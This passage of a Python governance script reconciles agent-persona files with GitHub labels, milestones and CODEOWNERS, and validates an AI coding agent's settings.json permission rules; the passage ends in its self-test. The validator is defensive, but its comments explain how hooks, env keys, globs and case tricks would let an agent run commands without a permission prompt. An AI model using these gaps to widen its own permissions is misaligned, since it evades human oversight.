    if full_label not in taxonomy_text:
        return False
    standalone = re.escape(PERSONA_PREFIX + trunc) + r"(?![\w-])"
    return re.search(standalone, taxonomy_text) is not None


# --- Check 1: roster <-> persona labels --------------------------------------------------

def reconcile_roster_labels(
    roster: "set[str]", labels: "set[str]", taxonomy_text: str
) -> "tuple[list[str], list[tuple[str, str]]]":
    """Return (problems, allowed_truncations). Empty problems ⇒ reconciled."""
    roster_only = set(roster) - set(labels)
    label_only = set(labels) - set(roster)
    allowed: "list[tuple[str, str]]" = []

    for slug in sorted(roster_only):
        if len(PERSONA_PREFIX + slug) <= GITHUB_LABEL_MAX:
            continue  # would fit un-truncated; a truncation here is not justified
        trunc = derive_truncated_label(slug)
        if trunc and trunc in label_only and truncation_documented(taxonomy_text, slug, trunc):
            allowed.append((slug, trunc))

    for slug, trunc in allowed:
        roster_only.discard(slug)
        label_only.discard(trunc)

    problems: "list[str]" = []
    # Truncated labels already accounted for by an "undocumented truncation" problem below;
    # they must NOT ALSO be reported as stale `label_only` labels (that double-counts one
    # issue as two — finding 7b).
    covered_truncations: "set[str]" = set()
    for slug in sorted(roster_only):
        full_label = PERSONA_PREFIX + slug
        if len(full_label) > GITHUB_LABEL_MAX:
            trunc = derive_truncated_label(slug)
            if trunc and not truncation_documented(taxonomy_text, slug, trunc):
                problems.append(
                    f"roster persona {slug!r} needs a truncated label "
                    f"'{PERSONA_PREFIX}{trunc}' (full '{full_label}' is {len(full_label)} > "
                    f"{GITHUB_LABEL_MAX} chars) but that truncation is not recorded in "
                    f"label-taxonomy.md — document it or reconcile the label"
                )
                if trunc in label_only:
                    # The truncated label exists; the problem above already covers this
                    # pair, so suppress the redundant stale-label message for it.
                    covered_truncations.add(trunc)
                continue
        problems.append(
            f"roster persona {slug!r} has no matching '{PERSONA_PREFIX}{slug}' GitHub label "
            f"— create the label, or remove/rename the .claude/agents/*.md wrapper whose "
            f"front-matter name is {slug!r}"
        )
    for label in sorted(label_only - covered_truncations):
        problems.append(
            f"GitHub label '{PERSONA_PREFIX}{label}' has no matching "
            f".claude/agents/{label}.md wrapper (front-matter name: {label}) — add the "
            f"wrapper, or delete the stale label"
        )
    return problems, allowed


def parse_documented_persona_labels(taxonomy_text: str) -> "set[str]":
    """Return the committed persona-label slug set documented in label-taxonomy.md.

    Reads the block delimited by the ``BEGIN/END persona-labels`` markers and returns the
    slug of every ``persona:<slug>`` label listed there (prefix stripped, matching what
    :func:`fetch_persona_labels` returns for the live set). This is the OFFLINE source of
    truth for the roster↔label check — it lets the gate catch a removed/added persona
    without the live GitHub label set. Labels are listed exactly as stored on GitHub, i.e.
    with the one documented 50-char truncation applied.

    Raises ``ValueError`` when the block is missing or empty so a mis-edit can't silently
    disable offline drift detection (a data error, surfaced as exit 2 by ``main``).
    """
    lines = taxonomy_text.splitlines()
    start = end = None
    for index, line in enumerate(lines):
        if PERSONA_LABELS_BEGIN in line:
            start = index
        elif PERSONA_LABELS_END in line:
            end = index
            break
    if start is None or end is None or end <= start:
        raise ValueError(
            "label-taxonomy.md is missing the delimited persona-labels block that the offline "
            "roster<->label check reads (expected 'BEGIN persona-labels' / 'END persona-labels' "
            "markers) — restore it so --offline can still catch roster/label drift"
        )
    labels: "set[str]" = set()
    token = re.compile(rf"^\s*{re.escape(PERSONA_PREFIX)}([\w-]+)\s*$")
    for line in lines[start + 1 : end]:
        match = token.match(line)
        if match:
            labels.add(match.group(1))
    if not labels:
        raise ValueError(
            "the persona-labels block in label-taxonomy.md lists no 'persona:<slug>' labels"
        )
    return labels


# --- Check 3: milestone dropdown <-> live milestones -------------------------------------

def parse_milestone_options(text: str) -> "list[str]":
    """Extract the `id: milestone` dropdown's `options:` list from an issue-form YAML.

    Stdlib-only, targeted parser for the GitHub issue-form structure (no PyYAML):
    locate `id: milestone`, bound the element at the next `- type:`, find its `options:`
    key, and collect the deeper-indented `- <value>` list items (quotes stripped).
    """
    lines = text.splitlines()
    start = None
    for index, line in enumerate(lines):
        if line.strip() == "id: milestone":
            start = index
            break
    if start is None:
        raise ValueError("no dropdown with 'id: milestone' found in the feature form")

    end = len(lines)
    for index in range(start + 1, len(lines)):
        if re.match(r"^\s*-\s+type:", lines[index]):
            end = index
            break

    options_indent = None
    options_line = None
    for index in range(start, end):
        match = re.match(r"^(\s*)options:\s*$", lines[index])
        if match:
            options_indent = len(match.group(1))
            options_line = index
            break
    if options_line is None:
        raise ValueError("the 'id: milestone' dropdown has no 'options:' list")

    options: "list[str]" = []
    for index in range(options_line + 1, end):
        raw = lines[index]
        if raw.strip() == "":
            continue
        indent = len(raw) - len(raw.lstrip(" "))
        if indent <= options_indent:
            break  # dedented out of the options list
        item = re.match(r"^\s*-\s+(.*)$", raw)
        if not item:
            break  # a deeper non-list line ends the options block
        value = item.group(1).strip()
        if len(value) >= 2 and value[0] in "\"'" and value[-1] == value[0]:
            value = value[1:-1]
        options.append(value)
    if not options:
        raise ValueError("the 'id: milestone' dropdown 'options:' list is empty")
    return options


def check_milestones(form_options: "list[str]", live_titles: "list[str]") -> "list[str]":
    """Return problems reconciling the dropdown options against live milestone titles."""
    problems: "list[str]" = []
    live = set(live_titles)
    form = list(form_options)
    for title in sorted(live):
        if title not in form:
            problems.append(
                f"live GitHub milestone {title!r} is missing from the feature_request.yml "
                f"milestone dropdown — add it as an option"
            )
    for option in form:
        if option in live or option in SENTINEL_MILESTONE_OPTIONS:
            continue
        problems.append(
            f"milestone dropdown option {option!r} is not a live GitHub milestone (nor a "
            f"documented sentinel) — remove or rename the stale option"
        )
    return problems


# --- Check 2: CODEOWNERS parse errors ----------------------------------------------------

def check_codeowners_errors(errors: "list") -> "list[str]":
    """Return one problem line per CODEOWNERS parse/owner error (empty ⇒ clean).

    GitHub's ``codeowners/errors`` payload lists objects shaped like
    ``{"path": ..., "line": N, "kind": ..., "message": ...}``. Any entry is a
    reconciliation failure. Kept a pure, testable function so the self-test can prove the
    check actually reddens on an error fixture (rather than being vacuously green).
    """
    problems: "list[str]" = []
    for err in errors:
        path = err.get("path", "?")
        kind = err.get("kind", "error")
        message = err.get("message", "")
        problems.append(f"{path}: {kind} — {message}".strip())
    return problems


# --- Check 4: .claude/settings.json permission surface -----------------------------------

def _bash_command(entry: str) -> "str | None":
    """Return the normalized command inside a ``Bash(...)`` permission entry, else None.

    ``Bash(gh  api:*)`` → ``gh api``: the ``Bash(...)`` wrapper and the trailing ``:*``
    argument wildcard are stripped, INTERNAL WHITESPACE IS COLLAPSED, and the result is
    LOWERCASED, so an entry cannot dodge the policy below by padding the command with extra
    spaces or a tab, nor by changing its case. Case matters because macOS/Windows
    filesystems are case-INSENSITIVE: ``Bash(GH api:*)`` resolves to the real ``gh`` binary
    and Claude Code honours the rule, so ``GH api`` must compare equal to ``gh api``
    (R5-F3). Non-``Bash`` entries (``Read(...)``, ``WebFetch(...)``) return None — this
    policy is about shell commands.
    """
    match = re.match(r"^Bash\((.*)\)$", entry.strip(), re.DOTALL)
    if not match:
        return None
    inner = match.group(1)
    if inner.endswith(":*"):
        inner = inner[: -len(":*")]
    return " ".join(inner.split()).lower()


def _token_prefix(shorter: str, longer: str) -> bool:
    """True when ``shorter`` equals ``longer`` or is a whole-TOKEN prefix of it.

    Token-aware so ``git`` matches ``git push`` (it would auto-allow it) while ``git-foo``
    does not — mirroring how Claude Code matches a permission prefix (``prefix + " "``).
    """
    return longer == shorter or longer.startswith(shorter + " ")


def validate_settings(path: str = DEFAULT_SETTINGS) -> "list[str]":
    """Return problems with `.claude/settings.json`'s permission surface (empty ⇒ clean).

    `.claude/settings.json` is a security-relevant control: an over-broad ``allow`` entry
    silently widens what an agent runs WITHOUT a prompt, and a deleted ``deny`` entry
    re-opens a mutating command. The file changes rarely and by hand, which is exactly the
    profile of a control that rots unwatched — so it is reconciled like any other governance
    artifact. Everything here is local, so the check runs identically offline and in CI.

    Enforced:

    * the file parses as JSON and ``permissions`` is an object;
    * ``allow`` and ``deny`` are LISTS OF STRINGS — the list type is asserted BEFORE
      iterating, so ``"allow": "Bash(gh:*)"`` is reported as a problem instead of being
      iterated character-by-character (which would vacuously "pass" every string check);
    * no ``allow`` entry auto-allows a mutating command: an entry is rejected when its
      normalized command is a token-prefix of (or equal to, or a longer form of) any of
      :data:`FORBIDDEN_ALLOW_COMMANDS`. This rejects the broad ``Bash(gh:*)`` and
      ``Bash(git:*)`` as well as the direct ``Bash(gh api:*)``. The comparison is
      CASE-INSENSITIVE: on a case-insensitive filesystem ``Bash(GH api:*)`` resolves to the
      real ``gh`` and the CLI honours the rule, so it must not slip past;
    * no TOOL-WIDE or unparseable Bash grant (``Bash``, ``Bash()``): a bare tool name allows
      every shell command, which is broader still than ``Bash(*)``;
    * no blanket wildcard (``Bash(*)``, ``Bash(:*)``, an empty command) and no GLOB — a ``*``
      surviving anywhere in the command after the trailing ``:*`` is stripped, e.g.
      ``Bash(gh *)`` / ``Bash(gh api*)``, is matched as ``^gh.*$``;
    * ``permissions.defaultMode``, when present, is one of :data:`ALLOWED_DEFAULT_MODES`
      (``default``/``plan``) — the two prompt-disabling modes in
      :data:`FORBIDDEN_DEFAULT_MODES` keep their sharper message, and every other value
      (notably ``acceptEdits``, which auto-approves file writes) is rejected too;
    * the key surface is an ALLOWLIST, not a blocklist: only :data:`ALLOWED_TOP_LEVEL_KEYS`
      may appear at top level and only :data:`ALLOWED_PERMISSION_KEYS` (plus the specifically
      rejected ``additionalDirectories``) inside ``permissions``. Every EXECUTABLE-VALUED key
      — ``hooks``, ``env``, ``apiKeyHelper``, ``statusLine``, and the rest of
      :data:`HELPER_COMMAND_KEYS` — is therefore rejected, as is any key added by a future
      Claude Code release that this gate has never heard of; such keys belong in
      ``settings.local.json``;
    * every entry of :data:`REQUIRED_DENY_ENTRIES` is present verbatim.

    Anything else in ``allow`` is out of scope: this bounds the file's blast radius, it does
    not certify the permission surface as a whole.

    Returns problems rather than raising so a malformed file reports as DRIFT (exit 1) with
    an actionable message, never as a traceback.
    """
    problems: "list[str]" = []
    try:
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
    except OSError as exc:
        return [f"{path}: cannot be read ({exc.__class__.__name__}: {exc})"]
    except json.JSONDecodeError as exc:
        return [f"{path}: is not valid JSON ({exc}) — fix the syntax"]

    if not isinstance(data, dict):
        return [f"{path}: top level must be a JSON object, got {type(data).__name__}"]
    permissions = data.get("permissions")
    if not isinstance(permissions, dict):
        return [
            f"{path}: 'permissions' must be an object, got "
            f"{type(permissions).__name__} — the permission gate cannot be validated"
        ]

    # Sibling keys widen the surface REGARDLESS of how tight allow/deny are, and several were
    # proven to auto-run a command while the allow/deny lists still validated clean. Naming
    # them one by one never closed: Claude Code ships new command-valued keys (`env`,
    # `apiKeyHelper`, `statusLine`, ...) faster than a blocklist can track (R5-F1). So the
    # policy is an ALLOWLIST — every top-level key outside :data:`ALLOWED_TOP_LEVEL_KEYS` is a
    # problem — with the specific "here is what this key executes" messages checked FIRST so
    # the report still explains the dangerous ones instead of saying only "unknown key".
    for key in data:
        if key in ALLOWED_TOP_LEVEL_KEYS:
            continue
        if key == "hooks":
            problems.append(
                f"{path}: project settings must not define hooks; put them in "
                f"settings.local.json — a tracked 'hooks' block runs arbitrary commands on "
                f"tool events with NO permission prompt, bypassing permissions.allow/deny "
                f"entirely"
            )
        elif key == "env":
            problems.append(
                f"{path}: project settings must not define 'env'; put it in "
                f"settings.local.json — it overrides the environment of every auto-allowed "
                f"command (PATH, GIT_*, http_proxy, ...), so it redirects commands the "
                f"allow list already approved with NO permission prompt"
            )
        elif key in HELPER_COMMAND_KEYS:
            # The parenthetical is only TRUE of apiKeyHelper (it runs at CLI startup, before
            # any tool call); the rest run on their own trigger, so they get the plain clause.
            startup = (
                " (apiKeyHelper runs at CLI startup, before any tool call)"
                if key == "apiKeyHelper"
                else ""
            )
            problems.append(
                f"{path}: project settings must not define {key!r}; put it in "
                f"settings.local.json — it runs a command with no permission prompt"
                f"{startup}"
            )
        else:
            problems.append(
                f"{path}: unknown top-level key {key!r} is not allowed in the tracked "
                f"project settings; put it in settings.local.json — only "
                f"{', '.join(repr(k) for k in ALLOWED_TOP_LEVEL_KEYS)} may appear here, "
                f"because a key this gate does not understand may execute a command with "
                f"no permission prompt"
            )

    # The same allowlist discipline inside `permissions`.
    for key in permissions:
        if key in ALLOWED_PERMISSION_KEYS:
            continue
        if key == "additionalDirectories":
            continue  # specific message emitted below
        problems.append(
            f"{path}: unknown key 'permissions.{key}' is not allowed in the tracked project "
            f"settings; put it in settings.local.json — 'permissions' may hold only "
            f"{', '.join(repr(k) for k in ALLOWED_PERMISSION_KEYS)}"
        )

    if "defaultMode" in permissions:
        default_mode = permissions.get("defaultMode")
        if isinstance(default_mode, str) and default_mode in FORBIDDEN_DEFAULT_MODES:
            problems.append(
                f"{path}: 'permissions.defaultMode' is {default_mode!r} — that mode skips the "
                f"permission prompt for every tool call, which makes the allow/deny lists below "
                f"moot; remove it and let the prompting default modes apply"
            )
        elif not isinstance(default_mode, str) or default_mode not in ALLOWED_DEFAULT_MODES:
            # e.g. `acceptEdits`: still prompts for Bash, but auto-approves every file write.
            # In the TRACKED settings that is a checked-out branch editing the worktree with
            # no prompt, so the allowlist admits only the fully prompting modes.
            problems.append(
                f"{path}: 'permissions.defaultMode' is {default_mode!r} — the tracked project "
                f"settings may only set "
                f"{' or '.join(repr(m) for m in ALLOWED_DEFAULT_MODES)} (any other mode "
                f"auto-approves tool calls, e.g. 'acceptEdits' auto-approves file writes); "
                f"put it in settings.local.json if a local worktree needs it"
            )
    if "additionalDirectories" in permissions:
        problems.append(
            f"{path}: 'permissions.additionalDirectories' is set "
            f"({permissions['additionalDirectories']!r}) — it widens file access beyond the "
            f"repository working tree, so it must not live in the tracked project settings; "
            f"put it in settings.local.json if a local worktree genuinely needs it"
        )

    lists: "dict[str, list]" = {}
    for key in ("allow", "deny"):
        value = permissions.get(key, [])
        # Type-check BEFORE iterating: a bare string is iterable, so `all(isinstance(x, str)
        # for x in value)` would be vacuously true for it and the whole policy below would
        # silently inspect single characters.
        if not isinstance(value, list):
            problems.append(
                f"{path}: 'permissions.{key}' must be a LIST of strings, got "
                f"{type(value).__name__} — wrap the entry in a JSON array"
            )
            continue
        non_strings = [item for item in value if not isinstance(item, str)]
        if non_strings:
            problems.append(
                f"{path}: 'permissions.{key}' contains {len(non_strings)} non-string "
                f"entry/entries (e.g. {non_strings[0]!r}) — every entry must be a string"
            )
        lists[key] = [item for item in value if isinstance(item, str)]

    for entry in lists.get("allow", []):
        stripped = entry.strip()
        if not re.match(r"^Bash\b", stripped):
            continue  # not a Bash rule (Read(...), WebFetch(...), BashOutput) — out of scope
        command = _bash_command(stripped)
        if command is None or stripped in ("Bash", "Bash()"):
            # A bare `Bash` is a TOOL-WIDE grant — Claude Code reads it as "allow every shell
            # command, never prompt". `Bash()` and any spelling this policy cannot parse are
            # treated the same way rather than skipped: an entry we cannot read must never
            # mean "unchecked".
            problems.append(
                f"{path}: allow entry {entry!r} is a tool-wide or malformed Bash grant — a "
                f"bare 'Bash' auto-allows EVERY shell command; write specific "
                f"'Bash(<command>:*)' entries for the read-only commands instead"
            )
            continue
        if command in ("", "*") or command.startswith("*"):
            problems.append(
                f"{path}: allow entry {entry!r} is a blanket wildcard — it auto-allows every "
                f"shell command; list the specific read-only commands instead"
            )
            continue
        if "*" in command:
            # Only a TRAILING `:*` (stripped above) is an argument wildcard. Any other `*` is
            # matched as a GLOB: `Bash(gh *)` and `Bash(gh api*)` become `^gh.*$` and auto-run
            # `gh api` / `gh pr merge` without a prompt.
            problems.append(
                f"{path}: allow entry {entry!r} (command {command!r}) contains a glob "
                f"wildcard '*' — Claude Code expands it to match any command line with that "
                f"prefix; use a literal command with the trailing ':*' argument wildcard only"
            )
            continue
        for forbidden in FORBIDDEN_ALLOW_COMMANDS:
            if _token_prefix(command, forbidden) or _token_prefix(forbidden, command):
                problems.append(
                    f"{path}: allow entry {entry!r} (command {command!r}) auto-allows "
                    f"'{forbidden}' — that command mutates repo/GitHub state and must always "
                    f"prompt; narrow the entry"
                )
                break

    deny = lists.get("deny")
    if deny is not None:
        present = set(deny)
        for required in REQUIRED_DENY_ENTRIES:
            if required not in present:
                problems.append(
                    f"{path}: deny list is missing {required!r} — restore it (a removed deny "
                    f"entry silently re-opens a mutating command)"
                )
    return problems


# --- gh plumbing -------------------------------------------------------------------------

def _gh(args: "list[str]", timeout: int = 90) -> "tuple[bool, str, str]":
    """Run `gh <args>`; return (ok, stdout, error). ok=False if gh is missing/errors."""
    if shutil.which("gh") is None:
        return (False, "", "gh CLI not found on PATH")
    try:
        proc = subprocess.run(
            ["gh", *args], capture_output=True, text=True, timeout=timeout
        )
    except subprocess.TimeoutExpired:
        return (False, "", f"gh timed out after {timeout}s")
    except OSError as exc:  # pragma: no cover - environment dependent
        return (False, "", f"could not execute gh: {exc}")
    if proc.returncode != 0:
        message = (proc.stderr or proc.stdout or "").strip()
        return (False, proc.stdout, message or f"gh exited {proc.returncode}")
    return (True, proc.stdout, "")


def fetch_persona_labels(repo: str) -> "tuple[bool, set[str], str]":
    ok, out, err = _gh(
        ["api", f"repos/{repo}/labels?per_page=100", "--paginate", "--jq", ".[].name"]
    )
    if not ok:
        return (False, set(), err)
    labels = {
        line.strip()[len(PERSONA_PREFIX):]
        for line in out.splitlines()
        if line.strip().startswith(PERSONA_PREFIX)
    }
    return (True, labels, "")


def fetch_milestones(repo: str) -> "tuple[bool, list[str], str]":
    ok, out, err = _gh(
        [
            "api",
            f"repos/{repo}/milestones?per_page=100&state=open",
            "--paginate",
            "--jq",
            ".[].title",
        ]
    )
    if not ok:
        return (False, [], err)
    titles = [line.strip() for line in out.splitlines() if line.strip()]
    return (True, titles, "")


def codeowners_errors_endpoint(repo: str, ref: "str | None") -> str:
    """Build the ``codeowners/errors`` API path, pinning to ``ref`` when provided.

    Without a ref GitHub validates the repository's DEFAULT branch; in CI we pass the PR
    head/merge SHA so a PR that *breaks* CODEOWNERS fails the PR gate — not only after it
    has already merged. The ref is URL-encoded so a full ref path (``refs/pull/N/merge``)
    is passed safely as a query value.
    """
    endpoint = f"repos/{repo}/codeowners/errors"
    if ref:
        endpoint += f"?ref={urllib.parse.quote(str(ref), safe='')}"
    return endpoint


def fetch_codeowners_errors(repo: str, ref: "str | None" = None) -> "tuple[bool, list, str]":
    ok, out, err = _gh(["api", codeowners_errors_endpoint(repo, ref)])
    if not ok:
        return (False, [], err)
    try:
        data = json.loads(out or "{}")
    except json.JSONDecodeError as exc:
        return (False, [], f"could not parse codeowners/errors response: {exc}")
    return (True, list(data.get("errors", [])), "")


# --- Orchestration -----------------------------------------------------------------------

class Result:
    """Outcome of a single check: status is 'pass' | 'fail' | 'skip'."""

    def __init__(self, name: str, status: str, lines: "list[str] | None" = None) -> None:
        self.name = name
        self.status = status
        self.lines = lines or []


def _remote_or_skip(
    name: str, offline: bool, fetch, require_remote: bool
) -> "tuple[Result | None, object]":
    """Handle the offline/skip/require-remote plumbing common to the remote API checks.

    Returns (early_result, payload). When early_result is not None the caller should use it
    directly (the remote data is unavailable); otherwise payload holds the fetched data.

    A remote check that cannot RUN (gh missing / API error) is reported with the ``skip``
    status — never ``fail`` — so a gh/API OUTAGE is not miscounted as roster drift. Under
    ``--require-remote`` that skip is escalated to a hard **exit 2** ("could not run —
    remote unavailable") by ``main``, distinct from drift (exit 1).
    """
    if offline:
        return Result(name, "skip", ["--offline: remote lookup skipped"]), None
    ok, payload, err = fetch()
    if not ok:
        detail = (
            f"could not run (remote unavailable): {err}"
            if require_remote
            else f"skipped: {err}"
        )
        return Result(name, "skip", [detail]), None
    return None, payload


def settings_result(path: str) -> Result:
    """Wrap :func:`validate_settings` as a reportable check ("settings-permissions")."""
    problems = validate_settings(path)
    detail = [
        f"{path}: allow/deny are string lists; no allow entry matches (case-insensitively) "
        f"the {len(FORBIDDEN_ALLOW_COMMANDS)} mutating git/gh prefixes in "
        f"FORBIDDEN_ALLOW_COMMANDS and none is a wildcard/glob or tool-wide Bash grant; no "
        f"defaultMode outside default/plan; only 'permissions' (plus `$schema` and the "
        f"{len(ALLOWED_TOP_LEVEL_KEYS) - 2} inert keys) at top level and only "
        f"allow/deny/defaultMode inside it, so no "
        f"executable-valued key (hooks, env, apiKeyHelper, statusLine, ...) and no "
        f"additionalDirectories; {len(REQUIRED_DENY_ENTRIES)} required deny entries present. "
        f"Other allow entries are not policed."
    ]
    return Result("settings-permissions", "fail" if problems else "pass", problems or detail)


def run_checks(args: argparse.Namespace) -> "list[Result]":
    repo = resolve_repo(args.repo, args.offline)
    ref = resolve_ref(args.ref)
    _log(f"Reconciling roster ↔ labels for repo: {repo}")
    if ref:
        _log(f"CODEOWNERS validated at ref: {ref}")
    _log("")

    roster, integrity, policed = read_roster(args.agents_dir)
    _log(f"Roster: {len(roster)} persona wrapper(s) under {args.agents_dir}")

    taxonomy_text = ""
    if os.path.exists(args.taxonomy):
        with open(args.taxonomy, "r", encoding="utf-8") as handle:
            taxonomy_text = handle.read()
    else:
        _warning(f"label taxonomy {args.taxonomy!r} not found — truncations cannot be verified")

    # The committed persona-label list is the OFFLINE source of truth for the roster↔label
    # check, so it is required: a missing/empty block is a data error (exit 2 via main), not
    # drift. This is what lets --offline catch a removed/added agent without the live labels.
    documented_labels = parse_documented_persona_labels(taxonomy_text)

    results: "list[Result]" = []

    # --- Check 1a: roster <-> DOCUMENTED persona labels (local; runs even with --offline) ---
    # Catches a persona added/removed vs the taxonomy the project commits. Local roster
    # integrity problems ride along here (this check always runs).
    problems, allowed = reconcile_roster_labels(roster, documented_labels, taxonomy_text)
    problems = integrity + problems
    detail = [
        f"{len(roster)} roster slug(s), {len(documented_labels)} documented persona "
        f"label(s) in {os.path.basename(args.taxonomy)}",
        f"front-matter policy applied to {policed} top-level wrapper(s): strict front-matter "
        f"parse, permissionMode in {'/'.join(ALLOWED_AGENT_PERMISSION_MODES)}, no "
        f"{'/'.join(FORBIDDEN_AGENT_KEYS)}, no unknown key",
    ]
    for slug, trunc in allowed:
        detail.append(f"allowed documented truncation: {slug} -> {PERSONA_PREFIX}{trunc}")
    results.append(
        Result("roster<->documented-labels", "fail" if problems else "pass", problems or detail)
    )

    # --- Check 4: .claude/settings.json permission surface (local; runs even --offline) ---
    # Placed before the remote checks so a malformed/over-broad permission file fails fast.
    results.append(settings_result(args.settings))

    # --- Check 1b: roster <-> LIVE persona labels (remote; catches GitHub UI-side drift) ---
    early, labels = _remote_or_skip(
        "roster<->live-labels", args.offline, lambda: fetch_persona_labels(repo), args.require_remote
    )
    if early is not None:
        results.append(early)
    else:
        problems, allowed = reconcile_roster_labels(roster, labels, taxonomy_text)
        detail = [f"{len(roster)} roster slug(s), {len(labels)} live persona label(s)"]
        for slug, trunc in allowed:
            detail.append(f"allowed documented truncation: {slug} -> {PERSONA_PREFIX}{trunc}")
        results.append(
            Result("roster<->live-labels", "fail" if problems else "pass", problems or detail)
        )

    # --- Check 2: CODEOWNERS parse errors (validated at the PR head/merge ref when in CI) ---
    early, errors = _remote_or_skip(
        "codeowners-errors", args.offline, lambda: fetch_codeowners_errors(repo, ref), args.require_remote
    )
    if early is not None:
        results.append(early)
    else:
        problems = check_codeowners_errors(errors)
        if problems:
            results.append(Result("codeowners-errors", "fail", problems))
        else:
            scope = f"ref {ref}" if ref else "default branch"
            results.append(Result("codeowners-errors", "pass", [f"0 CODEOWNERS errors ({scope})"]))

    # --- Check 3: milestone dropdown <-> live milestones ---
    form_options = parse_milestone_options_from_file(args.feature_form)
    early, live_titles = _remote_or_skip(
        "milestone-dropdown", args.offline, lambda: fetch_milestones(repo), args.require_remote
    )
    if early is not None:
        results.append(early)
    else:
        problems = check_milestones(form_options, live_titles)
        detail = [f"{len(form_options)} dropdown option(s), {len(live_titles)} live milestone(s)"]
        results.append(
            Result("milestone-dropdown", "fail" if problems else "pass", problems or detail)
        )

    return results


def parse_milestone_options_from_file(path: str) -> "list[str]":
    if not os.path.exists(path):
        raise FileNotFoundError(f"feature-request form {path!r} not found")
    with open(path, "r", encoding="utf-8") as handle:
        return parse_milestone_options(handle.read())


def _print_summary(results: "list[Result]") -> None:
    _log("")
    _log("Reconciliation summary")
    _log("----------------------")
    symbol = {"pass": "PASS", "fail": "FAIL", "skip": "SKIP"}
    for result in results:
        _log(f"[{symbol[result.status]}] {result.name}")
        for line in result.lines:
            _log(f"       - {line}")
            if result.status == "fail":
                _error(f"{result.name}: {line}")
            elif result.status == "skip":
                _warning(f"{result.name}: {line}")


# --- Self-test ---------------------------------------------------------------------------

def _selftest() -> int:
    failures: "list[str]" = []

    def check(condition: bool, label: str) -> None:
        if condition:
            _log(f"  ok  - {label}")
        else:
            failures.append(label)
            _log(f" FAIL - {label}")

    doc = (
        "GitHub caps label names at 50 characters. "
        "`persona:dotnet-vectorized-columnar-compute-engineer` is 51 characters, so its "
        "label drops the redundant trailing `-engineer`: "
        "`persona:dotnet-vectorized-columnar-compute`."
    )
    long_slug = "dotnet-vectorized-columnar-compute-engineer"
    trunc = "dotnet-vectorized-columnar-compute"

    check(derive_truncated_label(long_slug) == trunc, "derive_truncated_label drops -engineer")
    check(derive_truncated_label("product-manager") is None, "derive returns None for short slug")
    check(truncation_documented(doc, long_slug, trunc), "documented truncation recognised")
    check(
        not truncation_documented("no mention here", long_slug, trunc),
        "undocumented truncation rejected",
    )

    # Clean reconciliation with the one documented truncation.
    roster = {"product-manager", long_slug}
    labels = {"product-manager", trunc}
    problems, allowed = reconcile_roster_labels(roster, labels, doc)
    check(problems == [] and allowed == [(long_slug, trunc)], "clean roster reconciles (0 drift)")

    # Undocumented truncation must fail.
    problems, _ = reconcile_roster_labels(roster, labels, "nothing documented")
    check(len(problems) >= 1, "undocumented truncation flagged as drift")

    # Extra label / missing label.
    problems, _ = reconcile_roster_labels({"a"}, {"a", "b"}, doc)
    check(any("persona:b" in p for p in problems), "extra label flagged")
    problems, _ = reconcile_roster_labels({"a", "c"}, {"a"}, doc)
    check(any("'c'" in p for p in problems), "missing label flagged")

    # Dropdown parser + milestone check.
    form_yaml = (
        "  - type: dropdown\n"
        "    id: milestone\n"
        "    attributes:\n"
        "      label: Target roadmap milestone\n"
        "      options:\n"
        '        - "M1 — Engine foundations (v0.1)"\n'
        '        - "M2 — Storage & SQL (v0.x)"\n'
        '        - "Unsure / needs triage"\n'
        "    validations:\n"
        "      required: true\n"
        "  - type: textarea\n"
        "    id: personas\n"
    )
    options = parse_milestone_options(form_yaml)
    check(
        options == ["M1 — Engine foundations (v0.1)", "M2 — Storage & SQL (v0.x)", "Unsure / needs triage"],
        "milestone options parsed (quotes + sentinel)",
    )
    live = ["M1 — Engine foundations (v0.1)", "M2 — Storage & SQL (v0.x)"]
    check(check_milestones(options, live) == [], "dropdown matches live milestones (+sentinel)")
    check(
        any("missing" in p for p in check_milestones(options, live + ["M3 — X"])),
        "missing live milestone flagged",
    )
    check(
        any("stale" in p for p in check_milestones(options + ["M9 — Ghost"], live)),
        "stale dropdown option flagged",
    )

    # --- Finding 5: an over-long truncation (the truncated label itself > 50 chars) is refused.
    over_base = "x" * (GITHUB_LABEL_MAX - len(PERSONA_PREFIX) + 1)  # persona:<over_base> is 51 chars
    over_long_slug = over_base + TRUNCATION_SUFFIX
    check(
        len(PERSONA_PREFIX + over_base) > GITHUB_LABEL_MAX
        and derive_truncated_label(over_long_slug) is None,
        "derive_truncated_label rejects a truncation that would still exceed 50 chars",
    )

    # --- Finding 1: the CODEOWNERS parse-error check must FAIL on an error fixture and PASS
    # clean. (A mutation that suppresses codeowners/errors must redden, not stay green.)
    dirty_codeowners = [
        {"path": "CODEOWNERS", "line": 3, "kind": "Unknown owner",
         "message": "@nobody is not a valid owner"}
    ]
    check(len(check_codeowners_errors(dirty_codeowners)) >= 1, "CODEOWNERS parse error flagged (fails)")
    check(check_codeowners_errors([]) == [], "clean CODEOWNERS reconciles (passes)")

    # --- Finding 4: codeowners/errors is pinned to a ref (PR head), not always the default.
    check(
        codeowners_errors_endpoint("o/r", None) == "repos/o/r/codeowners/errors",
        "codeowners endpoint without ref → default branch",
    )
    check(
        codeowners_errors_endpoint("o/r", "abc123") == "repos/o/r/codeowners/errors?ref=abc123",
        "codeowners endpoint pins ref (PR head)",
    )
    check(
        "%2F" in codeowners_errors_endpoint("o/r", "refs/pull/5/merge"),
        "codeowners endpoint url-encodes a ref path",
    )

    # --- Finding 2: --offline reconciles the roster against the DOCUMENTED persona labels
    # committed to label-taxonomy.md, so a removed/added agent is caught with no network.
    taxonomy_block = (
        "prose about persona labels\n"
        "<!-- BEGIN persona-labels -->\n"
        "```text\n"
        "persona:product-manager\n"
        f"persona:{trunc}\n"
        "```\n"
        "<!-- END persona-labels -->\n"
    ) + doc  # `doc` records the full long slug + standalone trunc, so the truncation is allowed
    documented = parse_documented_persona_labels(taxonomy_block)
    check(documented == {"product-manager", trunc}, "documented persona labels parsed from taxonomy block")
    problems, allowed = reconcile_roster_labels({"product-manager", long_slug}, documented, taxonomy_block)
    check(
        problems == [] and allowed == [(long_slug, trunc)],
        "offline roster<->documented-labels reconciles (0 drift)",
    )
    problems, _ = reconcile_roster_labels({long_slug}, documented, taxonomy_block)
    check(
        any("product-manager" in p for p in problems),
        "offline catches a removed agent vs documented labels",
    )
    _block_missing_raised = False
    try:
        parse_documented_persona_labels("no markers, no block here")
    except ValueError:
        _block_missing_raised = True
    check(_block_missing_raised, "missing persona-labels block raises (offline coverage can't silently vanish)")

    # --- Finding 7b: an undocumented-but-PRESENT truncation is ONE problem (roster-side), not
    # also a duplicate stale-label problem for the same truncated label.
    problems, _ = reconcile_roster_labels({long_slug}, {trunc}, "nothing documented")
